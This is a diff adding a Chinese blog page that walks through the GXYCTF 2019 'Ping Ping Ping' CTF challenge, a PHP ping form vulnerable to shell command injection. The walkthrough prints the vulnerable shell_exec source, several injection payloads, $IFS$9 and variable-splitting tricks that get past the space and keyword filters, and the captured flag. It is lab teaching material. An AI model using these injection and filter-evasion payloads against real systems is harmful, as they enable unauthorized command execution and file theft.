@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/176191868?s=96&v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="[GXYCTF 2019\]Ping Ping Ping | NSSCTF](https://www.nssctf.cn/problem/1096)
+![image](https://github.com/user-attachments/assets/5f984538-9e63-4a91-899e-c9490e9544c2)
+> ping的题目，看了一些知识点拿来练练
+
+![image](https://github.com/user-attachments/assets/5e80ee1d-ec67-4c32-a3d5-61ac98b0ecd9)
+
+> 先来随便ping一下
+
+```
+127.0.0.1
+```
+
+得到
+
+![image](https://github.com/user-attachments/assets/94361425-da5d-432c-883c-3ffd564ee5a8)
+
+> 再尝试一下添加管道符加其他指令
+
+![image](https://github.com/user-attachments/assets/10f31790-ce1a-40ea-9a2e-7c8f0e1444f4)
+
+> [!IMPORTANT]
+发现目录下有两个php文件，有我们需要的flag
+
+> 尝试能不能获取flag
+
+ping `127.0.0.1|cat flag.php`
+
+![image](https://github.com/user-attachments/assets/9f40e914-1b6a-4666-ac3d-d08e1268c664)
+
+> **发现可能是空格被过滤了**
+
+**比如**
+
+1. 使用 `${IFS}` 代替空格
+
+2. 使用 `< `或 `>` 重定向符号
+
+3. 使用` {cat,flag.php}` 语法
+
+4. 使用 `$()` 或反引号执行命令
+
+5. 使用 `%09（Tab 字符）`代替空格
+
+都会被过滤
+
+贴张图
+
+![image](https://github.com/user-attachments/assets/ae17d744-c7fb-4fa7-a97b-f17612975d51)
+
+### 法一
+
+> [!TIP]
+使用$IFS$9绕过
+
+> 先看看index.php里面源码写了啥
+
+查看源码
+
+``` php
+	<?php
+	if(isset($_GET['ip'])){
+		$ip = $_GET['ip'];
+		if(preg_match('/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\'|\\|\(|\)|\[|\]|\{|\}/', $ip, $match)){
+			print_r($match);
+			print($ip);
+			echo preg_match('/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\'|\\|\(|\)|\[|\]|\{|\}/', $ip, $match);
+			die('fxck your symbol!');
+		}
+		else if(preg_match('/ /', $ip)){
+			die('fxck your space!');
+		}
+		else if(preg_match('/bash/', $ip)){
+			die('fxck your bash!');
+		}
+		else if(preg_match('/.*f.*l.*a.*g.*/', $ip)){
+			die('fxck your flag!');
+		}
+		$a = shell_exec('ping -c 4 '.$ip);
+		echo '<pre>';
+		print_r($a);
+	}
+
+	?>
+```
+
+> [!IMPORTANT]
+源码里面有过滤规则
+
+- /.*f.*l.*a.*g.*/只要匹配到这四个字符组合在一起就显示fxck your flag!了
+- 可以采取变量赋值的方式来做
+
+输入 ping `127.0.0.1;q=g;cat$IFS$9fla$q.php`
+
+再次查看源码
+
+![image](https://github.com/user-attachments/assets/99ff9d0f-3f88-497e-a744-3ec90aed297f)
+
+拿到flag
+
+**NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}**
+
+### 法二
+
+> [!TIP]
+这个方法比较巧妙
+
+***使用反引号绕过***
+
+==**原理：**==
+
+**linux下，会先执行反引号下面的语句
+在这里会执行ls,ls的结果是“index.php flag.php”
+所以最后执行的语句等价于
+cat index.php flag.php**
+
+试验一下
+
+ping一下
+
+![image](https://github.com/user-attachments/assets/08a85a49-f342-4e2a-9125-0867b84f8c01)
+
+也是成功拿到flag
+
+![image](https://github.com/user-attachments/assets/57a9377f-f349-4a9a-bf85-552bf28eae09)
+。">
+<meta property="og:title" content="Web 13 [GXYCTF 2019]Ping Ping Ping">
+<meta property="og:description" content="[GXYCTF 2019\]Ping Ping Ping | NSSCTF](https://www.nssctf.cn/problem/1096)
+![image](https://github.com/user-attachments/assets/5f984538-9e63-4a91-899e-c9490e9544c2)
+> ping的题目，看了一些知识点拿来练练
+
+![image](https://github.com/user-attachments/assets/5e80ee1d-ec67-4c32-a3d5-61ac98b0ecd9)
+
+> 先来随便ping一下
+
+```
+127.0.0.1
+```
+
+得到
+
+![image](https://github.com/user-attachments/assets/94361425-da5d-432c-883c-3ffd564ee5a8)
+
+> 再尝试一下添加管道符加其他指令
+
+![image](https://github.com/user-attachments/assets/10f31790-ce1a-40ea-9a2e-7c8f0e1444f4)
+
+> [!IMPORTANT]
+发现目录下有两个php文件，有我们需要的flag
+
+> 尝试能不能获取flag
+
+ping `127.0.0.1|cat flag.php`
+
+![image](https://github.com/user-attachments/assets/9f40e914-1b6a-4666-ac3d-d08e1268c664)
+
+> **发现可能是空格被过滤了**
+
+**比如**
+
+1. 使用 `${IFS}` 代替空格
+
+2. 使用 `< `或 `>` 重定向符号
+
+3. 使用` {cat,flag.php}` 语法
+
+4. 使用 `$()` 或反引号执行命令
+
+5. 使用 `%09（Tab 字符）`代替空格
+
+都会被过滤
+
+贴张图
+
+![image](https://github.com/user-attachments/assets/ae17d744-c7fb-4fa7-a97b-f17612975d51)
+
+### 法一
+
+> [!TIP]
+使用$IFS$9绕过
+
+> 先看看index.php里面源码写了啥
+
+查看源码
+
+``` php
+	<?php
+	if(isset($_GET['ip'])){
+		$ip = $_GET['ip'];
+		if(preg_match('/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\'|\\|\(|\)|\[|\]|\{|\}/', $ip, $match)){
+			print_r($match);
+			print($ip);
+			echo preg_match('/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\'|\\|\(|\)|\[|\]|\{|\}/', $ip, $match);
+			die('fxck your symbol!');
+		}
+		else if(preg_match('/ /', $ip)){
+			die('fxck your space!');
+		}
+		else if(preg_match('/bash/', $ip)){
+			die('fxck your bash!');
+		}
+		else if(preg_match('/.*f.*l.*a.*g.*/', $ip)){
+			die('fxck your flag!');
+		}
+		$a = shell_exec('ping -c 4 '.$ip);
+		echo '<pre>';
+		print_r($a);
+	}
+
+	?>
+```
+
+> [!IMPORTANT]
+源码里面有过滤规则
+
+- /.*f.*l.*a.*g.*/只要匹配到这四个字符组合在一起就显示fxck your flag!了
+- 可以采取变量赋值的方式来做
+
+输入 ping `127.0.0.1;q=g;cat$IFS$9fla$q.php`
+
+再次查看源码
+
+![image](https://github.com/user-attachments/assets/99ff9d0f-3f88-497e-a744-3ec90aed297f)
+
+拿到flag
+
+**NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}**
+
+### 法二
+
+> [!TIP]
+这个方法比较巧妙
+
+***使用反引号绕过***
+
+==**原理：**==
+
+**linux下，会先执行反引号下面的语句
+在这里会执行ls,ls的结果是“index.php flag.php”
+所以最后执行的语句等价于
+cat index.php flag.php**
+
+试验一下
+
+ping一下
+
+![image](https://github.com/user-attachments/assets/08a85a49-f342-4e2a-9125-0867b84f8c01)
+
+也是成功拿到flag
+
+![image](https://github.com/user-attachments/assets/57a9377f-f349-4a9a-bf85-552bf28eae09)
+。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://Nshpiter.github.io/post/Web%2013%20%5BGXYCTF%202019%5DPing%20Ping%20Ping.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/176191868?s=96&v=4">
+<title>Web 13 [GXYCTF 2019]Ping Ping Ping</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style><style>.markdown-alert.markdown-alert-important {border-left-color:var(--borderColor-done-emphasis, var(--color-done-emphasis));background-color:var(--color-done-subtle);}.markdown-alert.markdown-alert-important .markdown-alert-title {color: var(--fgColor-done,var(--color-done-fg));}</style>
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Web 13 [GXYCTF 2019]Ping Ping Ping</h1>
+<div class="title-right">
+    <a href="https://Nshpiter.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/Nshpiter/Nshpiter.github.io/issues/16" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p><a href="https://www.nssctf.cn/problem/1096" rel="nofollow">GXYCTF 2019]Ping Ping Ping | NSSCTF</a><br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5f984538-9e63-4a91-899e-c9490e9544c2"><img src="https://github.com/user-attachments/assets/5f984538-9e63-4a91-899e-c9490e9544c2" alt="image" style="max-width: 100%;"></a></p>
+<blockquote>
+<p>ping的题目，看了一些知识点拿来练练</p>
+</blockquote>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5e80ee1d-ec67-4c32-a3d5-61ac98b0ecd9"><img src="https://github.com/user-attachments/assets/5e80ee1d-ec67-4c32-a3d5-61ac98b0ecd9" alt="image" style="max-width: 100%;"></a></p>
+<blockquote>
+<p>先来随便ping一下</p>
+</blockquote>
+<pre class="notranslate"><code class="notranslate">127.0.0.1
+</code></pre>
+<p>得到</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/94361425-da5d-432c-883c-3ffd564ee5a8"><img src="https://github.com/user-attachments/assets/94361425-da5d-432c-883c-3ffd564ee5a8" alt="image" style="max-width: 100%;"></a></p>
+<blockquote>
+<p>再尝试一下添加管道符加其他指令</p>
+</blockquote>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/10f31790-ce1a-40ea-9a2e-7c8f0e1444f4"><img src="https://github.com/user-attachments/assets/10f31790-ce1a-40ea-9a2e-7c8f0e1444f4" alt="image" style="max-width: 100%;"></a></p>
+<div class="markdown-alert markdown-alert-important"><p class="markdown-alert-title"><svg class="octicon octicon-report mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>Important</p><p>发现目录下有两个php文件，有我们需要的flag</p>
+</div>
+<blockquote>
+<p>尝试能不能获取flag</p>
+</blockquote>
+<p>ping <code class="notranslate">127.0.0.1|cat flag.php</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9f40e914-1b6a-4666-ac3d-d08e1268c664"><img src="https://github.com/user-attachments/assets/9f40e914-1b6a-4666-ac3d-d08e1268c664" alt="image" style="max-width: 100%;"></a></p>
+<blockquote>
+<p><strong>发现可能是空格被过滤了</strong></p>
+</blockquote>
+<p><strong>比如</strong></p>
+<ol>
+<li>
+<p>使用 <code class="notranslate">${IFS}</code> 代替空格</p>
+</li>
+<li>
+<p>使用 <code class="notranslate">&lt; </code>或 <code class="notranslate">&gt;</code> 重定向符号</p>
+</li>
+<li>
+<p>使用<code class="notranslate"> {cat,flag.php}</code> 语法</p>
+</li>
+<li>
+<p>使用 <code class="notranslate">$()</code> 或反引号执行命令</p>
+</li>
+<li>
+<p>使用 <code class="notranslate">%09（Tab 字符）</code>代替空格</p>
+</li>
+</ol>
+<p>都会被过滤</p>
+<p>贴张图</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ae17d744-c7fb-4fa7-a97b-f17612975d51"><img src="https://github.com/user-attachments/assets/ae17d744-c7fb-4fa7-a97b-f17612975d51" alt="image" style="max-width: 100%;"></a></p>
+<h3>法一</h3>
+<div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p><p>使用$IFS$9绕过</p>
+</div>
+<blockquote>
+<p>先看看index.php里面源码写了啥</p>
+</blockquote>
+<p>查看源码</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">	<span class="pl-ent">&lt;?php</span>
+	<span class="pl-k">if</span>(<span class="pl-en">isset</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">ip</span>'</span>])){
+		<span class="pl-s1"><span class="pl-c1">$</span>ip</span> = <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">ip</span>'</span>];
+		<span class="pl-k">if</span>(<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|</span>\"<span class="pl-s">|</span>\\<span class="pl-s">|\(|\)|\[|\]|\{|\}/</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>ip</span>, <span class="pl-s1"><span class="pl-c1">$</span>match</span>)){
+			<span class="pl-en">print_r</span>(<span class="pl-s1"><span class="pl-c1">$</span>match</span>);
+			<span class="pl-k">print</span>(<span class="pl-s1"><span class="pl-c1">$</span>ip</span>);
+			<span class="pl-k">echo</span> <span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|</span>\"<span class="pl-s">|</span>\\<span class="pl-s">|\(|\)|\[|\]|\{|\}/</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>ip</span>, <span class="pl-s1"><span class="pl-c1">$</span>match</span>);
+			<span class="pl-en">die</span>(<span class="pl-s">"<span class="pl-s">fxck your symbol!</span>"</span>);
+		}
+		<span class="pl-k">else</span> <span class="pl-k">if</span>(<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/ /</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>ip</span>)){
+			<span class="pl-en">die</span>(<span class="pl-s">"<span class="pl-s">fxck your space!</span>"</span>);
+		}
+		<span class="pl-k">else</span> <span class="pl-k">if</span>(<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/bash/</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>ip</span>)){
+			<span class="pl-en">die</span>(<span class="pl-s">"<span class="pl-s">fxck your bash!</span>"</span>);
+		}
+		<span class="pl-k">else</span> <span class="pl-k">if</span>(<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/.*f.*l.*a.*g.*/</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>ip</span>)){
+			<span class="pl-en">die</span>(<span class="pl-s">"<span class="pl-s">fxck your flag!</span>"</span>);
+		}
+		<span class="pl-s1"><span class="pl-c1">$</span>a</span> = <span class="pl-en">shell_exec</span>(<span class="pl-s">"<span class="pl-s">ping -c 4 </span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span>ip</span>);
+		<span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">&lt;pre&gt;</span>"</span>;
+		<span class="pl-en">print_r</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>);
+	}
+
+	<span class="pl-ent">?&gt;</span></pre></div>
+<div class="markdown-alert markdown-alert-important"><p class="markdown-alert-title"><svg class="octicon octicon-report mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>Important</p><p>源码里面有过滤规则</p>
+</div>
+<ul>
+<li>/.*f.*l.*a.<em>g.</em>/只要匹配到这四个字符组合在一起就显示fxck your flag!了</li>
+<li>可以采取变量赋值的方式来做</li>
+</ul>
+<p>输入 ping <code class="notranslate">127.0.0.1;q=g;cat$IFS$9fla$q.php</code></p>
+<p>再次查看源码</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/99ff9d0f-3f88-497e-a744-3ec90aed297f"><img src="https://github.com/user-attachments/assets/99ff9d0f-3f88-497e-a744-3ec90aed297f" alt="image" style="max-width: 100%;"></a></p>
+<p>拿到flag</p>
+<p><strong>NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}</strong></p>
+<h3>法二</h3>
+<div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p><p>这个方法比较巧妙</p>
+</div>
+<p><em><strong>使用反引号绕过</strong></em></p>
+<p>==<strong>原理：</strong>==</p>
+<p><strong>linux下，会先执行反引号下面的语句<br>
+在这里会执行ls,ls的结果是“index.php flag.php”<br>
+所以最后执行的语句等价于<br>
+cat index.php flag.php</strong></p>
+<p>试验一下</p>
+<p>ping一下</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/08a85a49-f342-4e2a-9125-0867b84f8c01"><img src="https://github.com/user-attachments/assets/08a85a49-f342-4e2a-9125-0867b84f8c01" alt="image" style="max-width: 100%;"></a></p>
+<p>也是成功拿到flag</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/57a9377f-f349-4a9a-bf85-552bf28eae09"><img src="https://github.com/user-attachments/assets/57a9377f-f349-4a9a-bf85-552bf28eae09" alt="image" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://Nshpiter.github.io">piter的github</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","Nshpiter/Nshpiter.github.io");
+    script.setAttribute("issue-term","title");
+    
